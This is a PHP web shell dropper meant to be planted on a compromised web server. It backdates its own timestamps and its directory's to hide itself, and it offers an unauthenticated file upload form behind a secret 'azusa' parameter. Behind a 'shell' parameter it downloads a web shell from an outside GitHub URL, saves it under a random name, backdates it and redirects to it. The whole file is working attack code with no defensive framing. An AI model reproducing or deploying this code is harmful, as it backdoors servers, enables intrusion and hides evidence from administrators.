111111111111
<?PhP

// create function to change mtime and atime from a file

function change_file_time($file, $time)
{
    // check if $file exists
    if (file_exists($file)) {
        // change file mtime and atime
        if (touch($file, $time, $time)) {
            echo "Success change file time<br>";
        } else {
            echo "Failed change file time<br>";
        }
    } else {
        echo "File $file not found<br>";
    }
}
function generateRandom($length)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

// $file is this file path and name example: /home/user/public_html/ek.php
$file = __FILE__;
// change this file mtime and atime to 1 year ago
if (touch($file, time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
    echo "Success change file time<br>";
} else {
    echo "Failed change file time<br>";
}
// $dir is this file directory example: /home/user/public_html/
$dir = dirname(__FILE__);
// change this file directory mtime and atime to 1 year ago
if (touch($dir, time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
    echo "Success change file time<br>";
} else {
    echo "Failed change file time<br>";
}
// display file mtime and atime
echo "File mtime: " . date("Y-m-d H:i:s", filemtime($file)) . "<br>";

if (isset($_GET['azusa'])) {
    if ($_POST) {
        if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
            echo "<b>berhasil</b>-->" . $_FILES["f"]["name"] . "<br>";
        } else {
            echo "<b>gagal";
        }
    } else {
        echo "<form method=post enctype=multipart/form-data>
	<input type=file name=f>
	<input name=v type=submit id=v value=up><br>";
    }
} else {
    if (isset($_GET['shell'])) {
        $folderName = 'ciel_shell';
        $randomFileName = generateRandom(5) . ".php";
        // Check if the folder exists then remove the folder if exists
        if (file_exists($folderName)) {
            // remove folder
            if (rmdir($folderName)) {
                echo "Success remove folder $folderName<br>";
            } else {
                echo "Failed remove folder $folderName<br>";
            }
        }
        // create folder
        if (mkdir($folderName)) {
            echo "Success create folder $folderName<br>";
        }
        // change folder mtime and atime to 1 year ago
        if (touch($folderName, time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
            echo "Success change folder time<br>";
        } else {
            echo "Failed change folder time<br>";
        }
        // if $randomFileName not exists in $folderName then create file $randomFileName with content from https://pastebin.com/raw/6FbijY4p
        if (!file_exists($folderName . "/" . $randomFileName)) {
            $content = file_get_contents("https://github.com/azusa-sama/Webshell/raw/master/turkshell.php");
            // if success put content to file $randomFileName then echo success
            if (file_put_contents($folderName . "/" . $randomFileName, $content)) {
                echo "Success create file $randomFileName<br>";
                // change file mtime and atime to 1 year ago
                if (touch($folderName . "/" . $randomFileName, time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
                    echo "Success change file time<br>";
                } else {
                    echo "Failed change file time<br>";
                }
            } else {
                echo "Failed create file $randomFileName<br>";
            }

            // redirect to $folderName/$randomFileName
            header("Location: $folderName/$randomFileName");
        } else {
            // remove file $randomFileName then create file $randomFileName with content from https://pastebin.com/raw/6FbijY4p
            if (unlink($folderName . "/" . $randomFileName)) {
                $content = file_get_contents("https://github.com/azusa-sama/Webshell/raw/master/turkshell.php");
                // if success put content to file $randomFileName then echo success
                if (file_put_contents($folderName . "/" . $randomFileName, $content)) {
                    echo "Success create file $randomFileName<br>";
                    // change file mtime and atime to 1 year ago
                    if (touch($folderName . "/" . $randomFileName, time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
                        echo "Success change file time<br>";
                    } else {
                        echo "Failed change file time<br>";
                    }
                } else {
                    echo "Failed create file $randomFileName<br>";
                }
            } else {
                echo "Failed remove file $randomFileName<br>";
            }

            // redirect to $folderName/$randomFileName
            header("Location: $folderName/$randomFileName");
        }
    }
}
